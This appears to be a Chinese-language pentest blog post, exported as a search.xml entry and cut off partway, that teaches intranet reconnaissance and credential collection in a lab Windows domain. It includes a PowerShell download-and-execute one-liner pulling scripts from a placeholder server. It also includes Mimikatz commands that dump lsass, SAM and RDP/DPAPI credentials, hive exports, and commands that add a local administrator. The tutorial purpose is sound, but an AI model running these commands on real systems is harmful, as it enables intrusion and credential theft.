<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>域渗透(二)-内网信息收集</title>
      <link href="/2023/09/03/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%BA%8C)-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/09/03/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%BA%8C)-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-本机基础信息收集"><a href="#1-本机基础信息收集" class="headerlink" title="1.本机基础信息收集"></a>1.本机基础信息收集</h2><h3 id="1-系统信息搜集"><a href="#1-系统信息搜集" class="headerlink" title="1.系统信息搜集"></a>1.系统信息搜集</h3><p>1.查看操作系统信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS VersioN&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031023541.png" alt="image.png"></p><p>2.查看当前的进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist</span><br><span class="line">tasklist /SVC</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031025782.png" alt="image.png"></p><p>WMIC是Windows管理规范的命令行工具<br>通过wmic查询主机进程信息，过滤出进程的路径、名称和PID</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process get Name, ProcessId, ExecutablePath</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031028007.png" alt="image.png"></p><p>查看指定进程的路径信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process where Name=&quot;msdtc.exe&quot; get ExecutablePath</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031028574.png" alt="image.png"></p><p>3.查看当前的服务信息<br>查看所有服务信息并过滤出服务的名称、路径、创建时间、运行状态信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service get Caption,Name,PathName,StartName,State</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031030707.png" alt="image.png"></p><p>查看指定服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service where Name=&quot;vds&quot; get Caption,Name,PathName,StartName,State</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031034263.png" alt="image.png"></p><p>4.查看计划任务信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /query /v /fo list </span><br><span class="line">schtasks /query /v /fo list &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031036114.png" alt="image.png"></p><p>5.查看程序自启动程序信息<br>查看自启动程序信息，过滤出 名称、执行命令、执行路径、所属用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic startup get Caption,Command,Location,User</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031040978.png" alt="image.png"></p><p>6..查看补丁安装信息<br>查看当前主机上安装的补丁列表，并过滤出补丁连接、名称、描述、补丁编号以及安装时间,可以推测目标主机系统版本和缺少的补丁辅助后面的提权。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031143129.png" alt="image.png"></p><p>7.查看应用安装信息<br>查看主机安装的应用软件信息，并过滤出应用的名称和版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wmic product get Caption,Version</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031141646.png" alt="image.png"></p><h3 id="2-用户信息搜集"><a href="#2-用户信息搜集" class="headerlink" title="2.用户信息搜集"></a>2.用户信息搜集</h3><ol><li>查看用户及所处组、所拥有特权<br>测试人员可以根据当前所有的信息对当前用户权限进行一个判断,推测是否需要进一步提权<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure></li></ol><p>2.查看本地用户&#x2F;组信息<br>查看用户信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br><span class="line">net user &lt;username&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031148012.png" alt="image.png"></p><p>产看本地管理员组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031149312.png" alt="image.png"><br>该主机加入域时,域全局组”HACK-MY\Domain Admins”自动添加到计算机本地Administratos组中。</p><p>主机本地创建一个新用户并加入管理员组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &lt;username&gt; &lt;password&gt; /add</span><br><span class="line">net localgroup Administrators &lt;username&gt; /add</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031152986.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031152673.png"></p><p>3.查看当前登录用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031154032.png" alt="image.png"></p><h3 id="3-网络信息搜集"><a href="#3-网络信息搜集" class="headerlink" title="3.网络信息搜集"></a>3.网络信息搜集</h3><p>1.查看网络配置信息，包括IP，主机名等</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>有多网段尝试后期横向移动<br>DNS服务器的IP一般为DC的IP<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031157283.png" alt="image.png"></p><p>2.查看主机路由信息（路由表）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><p>网络目标都是主机可以访问到的,可以用来看IP段,测试人可在后续的横向渗透中尝试探测其中的存活主机</p><p>3.查看端口连接信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031201862.png" alt="image.png"></p><p>4.查看当前会话列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><p>查看当前主机与客户端主机的会话</p><p>5.查看当前主机网络共享信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031205511.png" alt="image.png"></p><p>6.查看已连接的网络共享</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure><h2 id="2-域内信息搜集"><a href="#2-域内信息搜集" class="headerlink" title="2.域内信息搜集"></a>2.域内信息搜集</h2><p>1.判断是否存在域环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p>查看工作站信息，包括计算机名、用户名、系统版本名、工作站、登录域信息。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031208863.png" alt="image.png"></p><p>2.查看域内用户信息<br>查看所有域用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031209598.png" alt="image.png"></p><p>查看指定域用户的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &lt;username&gt; /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031210145.png" alt="image.png"></p><p>获取所有用户的SID、所属域和用户描述信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get Caption,Domain,Description</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031213328.png" alt="image.png"><br>只有域用户具有权限执行域内查询操作。非域用户除非是本机系统权限，否则只能查询本机信息。所有与域相关的查询都需要通过域控制器来实现，并且需要经过Kerberos协议进行认证。</p><p>3.查看域用户组信息<br>列出所有的域内用户组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031222625.png" alt="image.png"></p><p>查询域管理员组。得到所有的域管理员用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031227086.png" alt="image.png"></p><p>查询域成员组,得到域内所有的客户端主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031344930.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031343628.png" alt="image.png"></p><p>4.查看域内密码策略</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031345113.png" alt="image.png"></p><p>5.查看域控制器列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><p>可以得到所有的域控制器的主机名<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031348505.png" alt="image.png"></p><p>也可以通过nltest命令查询指定域控制器主机列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /DCLIST:hack-my.com</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031349397.png"></p><p>6.查看主域控制器<br>主控制器会被用作时间服务器，所有域中计算机的时钟同步</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031350356.png" alt="image.png"></p><p>7.定位域控制器<br>知道目标主机名可以对主机使用ping命令，根据返回内容得知目标主机在内网中的IP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping DC.hack-my.com</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031351951.png" alt="image.png"></p><p>8.查看域信任关系</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><p>域信任用于多域环境中的跨域资源共享，可以查看当前主机所在域和其他域间的信任关系<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309031352883.png" alt="image.png"></p><h2 id="3-内网资源探测"><a href="#3-内网资源探测" class="headerlink" title="3.内网资源探测"></a>3.内网资源探测</h2><h3 id="1-发现内网存活主机"><a href="#1-发现内网存活主机" class="headerlink" title="1.发现内网存活主机"></a>1.发现内网存活主机</h3><p>1.基于icmp发现存活主机<br>对整个网段进行ping命令<br>循环探测整个局域网C段中存活的主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot;</span><br><span class="line">-n 发送数据包数</span><br><span class="line">-w ping的时间</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040905713.png" alt="image.png"></p><p>2.基于netbios协议发现存活主机<br>netbios工作流程是将机器名解析，查询，应答。Windows中，默认安装TCP&#x2F;IP后会自动安装netbios.<br>向局域网中每个ip发送netbios查询，可以获得主机名、mac地址等信息</p><p>nbtscan是一款用于扫描Windows网络上的netbios名称的程序，用于发现内网中存活的Windows主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbtscan.exe 10.10.10.0/24</span><br></pre></td></tr></table></figure><p>kali自带nbtscan<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040910745.png"><br>windows: <a href="https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4">https://github.com/lifenjoiner/nbtscan/releases/tag/nbtscan-v1.5.2-2394b4</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040922891.png" alt="image.png"></p><p>3.基于UDP发现存活主机<br>将空的UDP报文发送给目标主机特定端口，如果端口关闭，UDP探测就能马上得到ICMP端口无法到达的回应报文。<br>如果开放端口，大部分服务仅忽略这个空报文而不做任何回应</p><p>Unicornscan是kali的信息搜集工具，提供了网络扫描功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unicornscan -mU 10.10.10.0/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040945461.png" alt="image.png"></p><p>4.基于ARP在实际利用中，可以向网络发送一个ARP请求，若目标主机处于活跃状态，则其一定会回应一个ARP响应，否则不会做出任何回应。<br>a.ARP-scan<br>ARP-scan利用ARP发现内网中存活的主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><p>linux&#x2F;macos:<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a><br>windows:<a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040952210.png" alt="image.png"></p><p>b.PowerShell的利用<br>Empire渗透框架的Invoke-ARPScan.psl脚本可利用ARP发现内网存活主机（项目见Github上的相关网页)。使用时，需要将脚本导入执行<br>项目地址:<a href=""></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-ARPScan.ps1</span><br><span class="line">Invoke-ARPScan -CIDR 10.10.10.0/24</span><br></pre></td></tr></table></figure><p>也要将脚本代码托管在服务器上，通过PowerShell远程加载执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-ARPScan.ps1&#x27;)</span><br><span class="line">;Invoke-ARPscan -CIDR 10.10.10.0/24&quot;</span><br></pre></td></tr></table></figure><p>注:<br>如果出现Powershell报错：因为在此系统上进制运行脚本。需要进行执行策略更改。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041005387.png" alt="image.png"></p><p>5.基于SMB协议发现存活主机<br>SMB主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通信资源。CIFS消息一般使用NetBOIS或TCP发送，分别使用139或445端口，目前倾向于445端口。<br>实际利用中可以探测局域网中存在的SMB服务从而发现内网存活主机，多适用于Windows主机的发现。<br>CrackMapExec 是一款十分强大的后渗透利用工具<br>能够枚举登录用户，枚举SMB服务列表，执行WINRM攻击等功能。<br>kali上直接apt-get命令安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.0/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041014676.png" alt="image.png"></p><h3 id="2-内网端口扫描"><a href="#2-内网端口扫描" class="headerlink" title="2.内网端口扫描"></a>2.内网端口扫描</h3><p>a.利用Telnet探测端口<br>Telnet可以简单测试指定端口是开启还是关闭</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041015755.png" alt="image.png"></p><p>b.Nmap<br>扫描指定端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80,88,135,139,443,8080,3306,3389 10.10.10.11</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041016826.png" alt="image.png"></p><p>全端口扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -p 1-65535 10.10.10.11</span><br></pre></td></tr></table></figure><p>扫描并获取指定端口上开放的服务版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041019054.png"></p><p>c. 利用PowerShell进行端口扫描<br>Nishang是基于PowerShell的渗透测试专用框架，集成了各种脚本和Payload,广泛应用域渗透测试各阶段。<br>NiShang的Scan模块中也有一个Invoke-PortScan.ps1脚本，可以用来对主机进行端口扫描<br>对内网的一个主机范围执行默认的端口扫描<br>脚本地址:<a href="https://github.com/chicagoadmin/nishang/blob/c3fdf5e5dfa8612d0a17636dbb096b04e987ab31/Scan/Invoke-PortScan.ps1#L4">https://github.com/chicagoadmin/nishang/blob/c3fdf5e5dfa8612d0a17636dbb096b04e987ab31/Scan/Invoke-PortScan.ps1#L4</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.20 -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041035136.png" alt="image.png"></p><p>对内网中的一个主机范围扫描指定的端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-portscan.ps1&#x27;);Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.20 -ResolveHost -ScanPort -Port 80,88,135,139,443,8080,3306,3389&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041042928.png" alt="image.png"> </p><h3 id="3-Metasploit探测内网"><a href="#3-Metasploit探测内网" class="headerlink" title="3.Metasploit探测内网"></a>3.Metasploit探测内网</h3><p>具体利用方法自行查阅相关文档<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041043063.png" alt="image.png"><br>例: 基于ARP探测存活主机<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041114036.png" alt="image.png"></p><h3 id="4-获取端口Banner信息"><a href="#4-获取端口Banner信息" class="headerlink" title="4.获取端口Banner信息"></a>4.获取端口Banner信息</h3><p>端口Banner-端口连接的欢迎语<br>1.Nc获取banner</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv 10.10.10.15 21</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041117127.png" alt="image.png"></p><p>2.Telnet获取banner</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 10.10.10.15 21</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041118028.png" alt="image.png"></p><p>3.利用Nmap获取banner</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=banner 10.10.10.15</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041120947.png" alt="image.png"></p><h2 id="4-用户凭据收集"><a href="#4-用户凭据收集" class="headerlink" title="4.用户凭据收集"></a>4.用户凭据收集</h2><h3 id="1-获取域内单机密码和哈希值"><a href="#1-获取域内单机密码和哈希值" class="headerlink" title="1.获取域内单机密码和哈希值"></a>1.获取域内单机密码和哈希值</h3><p>Windows中，SAM文件是Windows用户的账户数据库，位于系统的%SystemRoot%\System32\Config,存储了本地用户名，密码的哈希值。</p><p>用户登陆时，输入的明文密码被转换为哈希值，然后与SAM文件中的哈希值进行对比。</p><p>lsass.exe是Windows的一个系统进程，用于实现系统的安全机制。用户输入密码登录后，登陆的域名，用户名和登录凭证等信息会被存储在lsass.exe进程空间中，用户的明文密码经过WDigest和Tspkg模块调用后会对其使用可逆的算法进行加密并存储在内存中。</p><p>获取密码hash的工具很多，大多是</p><ol><li>读取SAM文件</li><li>访问lsass.exe进程的内存数据等操作实现</li></ol><p>一般需要先提权</p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Mimakatz是一款功能强大的凭证转储开源程序，可以帮助测试人员提升进程权限、注入进程、读取进程内存等，广泛用于内网渗透测试领域。</p><p>项目地址:<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>1.在线读取lsass进程内存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br><span class="line">#privilege::debug 用于提升至DebugPrivilege权限</span><br><span class="line">#sekurlsa::logonpasswords 用于导出用户凭证</span><br></pre></td></tr></table></figure><p>可直接从lsass.exe进程的内存中读取当前已登录用户的凭据<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041203029.png" alt="image.png"></p><p>2.离线读取lsass内存文件<br>可以将lsass.exe进程的内存转储，将内存文件导出到本地后使用Mimikatz进行离线读取</p><p>微软提供Procdump工具进行内存转储<br>下载地址:<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041201519.png" alt="image.png"></p><p>导出用户凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br><span class="line">#sekurlsa::minidump lsass.dmp 用于加载内存文件</span><br><span class="line">#sekurlsa::logonpasswords 用于导出用户凭据</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041207683.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041857712.png" alt="image.png"></p><p>3.在线读取本地SAM文件<br>将mimikatz.exe上传到目标主机并执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br><span class="line">#token::elevate 用于提升至System权限</span><br><span class="line">#lsadump::sam 用于读取本地SAM文件</span><br></pre></td></tr></table></figure><p>读取SAM文件中保存的用户凭证，导出当前系统中所有本地用户的哈希值<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041850899.png" alt="image.png"></p><p>4.离线读取本地SAM文件<br>离线读取就是将SAM文件导出，使用mimikatz加载并读取其中的用户登录凭据等信息。<br>Windows为了提高SAM文件的安全性防止离线破解，会对SAM文件使用密钥加密，这个密钥存储在SYSTEM文件中，域SAM位于相同目录下。</p><p>首先，在目标主机上导出SAM和SYSTEM两个文件。因为系统在运行时，这两个<br>文件是被锁定的，所以需要借助一些工具来实现，而PowerSploit项目中提供的Invoke-NinjaCopy.ps1脚本可以完成这项工作。<br>脚本地址:<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Windows\Temp\SAM</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination C:\Windows\Temp\SYSTEM</span><br></pre></td></tr></table></figure><p>会在Temp目录下生成SAM和SYSTEM两个文件<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041909320.png" alt="image.png"></p><p>也可以在管理员权限下执行以下命令，通过保存注册表的方式导出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SAM sam.hive</span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br></pre></td></tr></table></figure><p>会在当前目录下生成sam.hive 和system.hive<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041911272.png" alt="image.png"></p><p>将导出的SAM和SYSTEM文件复制到本地，使用mimikatz加载读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041912438.png" alt="image.png"></p><h3 id="2-获取常见应用软件凭据"><a href="#2-获取常见应用软件凭据" class="headerlink" title="2.获取常见应用软件凭据"></a>2.获取常见应用软件凭据</h3><h4 id="1-获取RDP保存的凭据"><a href="#1-获取RDP保存的凭据" class="headerlink" title="1.获取RDP保存的凭据"></a>1.获取RDP保存的凭据</h4><p>RDP凭据都使用数据保护API以加密形式存储在Windows的凭据管理器中<br>路径为 %USERPROFILE%\AppData\Local\Microsoft\Credentials</p><p>环境设置<br>被登陆机开启远程登陆，关闭仅允许运行使用网络级别身份验证的远程桌面的计算机连接<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309042359940.png" alt="image.png"><br>破解机连接受控机<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050014900.png" alt="imag.png"><br>成功连接到远程桌面<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050016996.png" alt="image.png"></p><p>查看主机上保存的连接凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看当前保存的凭据</span><br><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050018804.png" alt="image.png">  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#遍历Credentials目录下保存的凭据</span><br><span class="line">dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050018087.png" alt="image.png"><br>使用mimikatz导出指定的RDP连接凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\ [凭据名]&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050029460.png" alt="image.png"><br>获得guidMasterKey,phData<br>phData是凭据的加密数据<br>guidMasterKey是凭据的GUID</p><p>记录下guidMasterKey执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit</span><br></pre></td></tr></table></figure><p>找到GUID关联的MasterKey,MasterKey是加密凭据所使用的密钥。<br>记录masterkey<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050033091.png" alt="image.png"></p><p>最后执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\[凭据名] /masterkey:[抓到的masterkey]&quot; exit</span><br></pre></td></tr></table></figure><p>成功破解获得RDP铭文凭据<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051336171.png" alt="image.png"><br>CredentialBlob即是Administrator密码</p><h4 id="2-获取Xshell保存的凭据"><a href="#2-获取Xshell保存的凭据" class="headerlink" title="2.获取Xshell保存的凭据"></a>2.获取Xshell保存的凭据</h4><p>Xshell会将服务器连接信息保存在Session目录下的.xsh文件中<br>如果用户在连接时勾选了记住用户名&#x2F;密码，该文件会保存远程服务器连接的用户名和及你给过加密后的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSHELL版本对应.xsh文件路径</span><br><span class="line">Xshell 5 - 